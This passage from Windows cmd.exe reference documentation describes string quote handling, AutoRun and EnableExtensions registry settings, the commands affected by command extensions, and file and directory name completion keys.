    If the previous conditions aren't met, *string* is processed by examining the first character to verify whether it is an opening quotation mark. If the first character is an opening quotation mark, it is stripped along with the closing quotation mark. Any text following the closing quotation marks is preserved.

- If you don't specify **/d** in *string*, Cmd.exe looks for the following registry subkeys:

    - **HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun\REG_SZ**

    - **HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun\REG_EXPAND_SZ**

    If one or both registry subkeys are present, they're executed before all other variables.

    > [!CAUTION]
    > Incorrectly editing the registry may severely damage your system. Before making changes to the registry, you should back up any valued data on the computer.

- You can disable command extensions for a particular process by using **/e:off**. You can enable or disable extensions for all **cmd** command-line options on a computer or user session by setting the following **REG_DWORD** values:

    - **HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\EnableExtensions\REG_DWORD**

    - **HKEY_CURRENT_USER\Software\Microsoft\Command Processor\EnableExtensions\REG_DWORD**

    Set the **REG_DWORD** value to either **0Ã—1** (enabled) or **0Ã—0** (disabled) in the registry by using Regedit.exe. User-specified settings take precedence over computer settings, and command-line options take precedence over registry settings.

    > [!CAUTION]
    > Incorrectly editing the registry may severely damage your system. Before making changes to the registry, you should back up any valued data on the computer.

    When you enable command extensions, the following commands are affected:
    - **assoc**

    - **call**

    - **chdir (cd)**

    - **color**

    - **del (erase)**

    - **endlocal**

    - **for**

    - **ftype**

    - **goto**

    - **if**

    - **mkdir (md)**

    - **popd**

    - **prompt**

    - **pushd**

    - **set**

    - **setlocal**

    - **shift**

    - **start** (also includes changes to external command processes)

- If you enable delayed environment variable expansion, you can use the exclamation point character to substitute the value of an environment variable at run time.

- File and directory name completion is not enabled by default. You can enable or disable file name completion for a particular process of the **cmd** command with **/f:**{**on** | **off**}. You can enable or disable file and directory name completion for all processes of the **cmd** command on a computer or for a user logon session by setting the following **REG_DWORD** values:

    - **HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\CompletionChar\REG_DWORD**

    - **HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\PathCompletionChar\REG_DWORD**

    - **HKEY_CURRENT_USER\Software\Microsoft\Command Processor\CompletionChar\REG_DWORD**

    - **HKEY_CURRENT_USER\Software\Microsoft\Command Processor\PathCompletionChar\REG_DWORD**

    To set the **REG_DWORD** value, run Regedit.exe and use the hexadecimal value of a control character for a particular function (for example, **0Ã—9** is TAB and **0Ã—08** is BACKSPACE). User-specified settings take precedence over computer settings, and command-line options take precedence over registry settings.

    > [!CAUTION]
    > Incorrectly editing the registry may severely damage your system. Before making changes to the registry, you should back up any valued data on the computer.

- If you enable file and directory name completion by using **/f:on**, use **CTRL+D** for directory name completion and **CTRL+F** for file name completion. To disable a particular completion character in the registry, use the value for white space [**0Ã—20**] because it is not a valid control character.

  - Pressing **CTRL+D** or **CTRL+F**, processes the file and directory name completion. These key combination functions append a wildcard character to *string* (if one is not present), builds a list of paths that match, and then displays the first matching path.<p>If none of the paths match, the file and directory name completion function beeps and does not change the display. To move through the list of matching paths, press **CTRL+D** or **CTRL+F** repeatedly. To move through the list backwards, press the **SHIFT** key and **CTRL+D** or **CTRL+F** simultaneously. To discard the saved list of matching paths and generate a new list, edit *string* and press **CTRL+D** or **CTRL+F**. If you switch between **CTRL+D** and **CTRL+F**, the saved list of matching paths is discarded and a new list is generated. The only difference between the key combinations **CTRL+D** and **CTRL+F** is that **CTRL+D** only matches directory names and **CTRL+F** matches both file and directory names. If you use file and directory name completion on any of the built-in directory commands (that is, **CD**, **MD**, or **RD**), directory completion is assumed.

  - File and directory name completion correctly processes file names that contain white space or special characters if you place quotation marks around the matching path.

  - You must use quotation marks around the following special characters: & < > [ ] | { } ^ = ; ! ' + , ` ~ [white space].

  - If the information that you supply contains spaces, you must use quotation marks around the text (for example, "Computer Name").

  - If you process file and directory name completion from within *string*, any part of the *path* to the right of the cursor is discarded (at the point in *string* where the completion was processed).

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020-2021 Strontic.


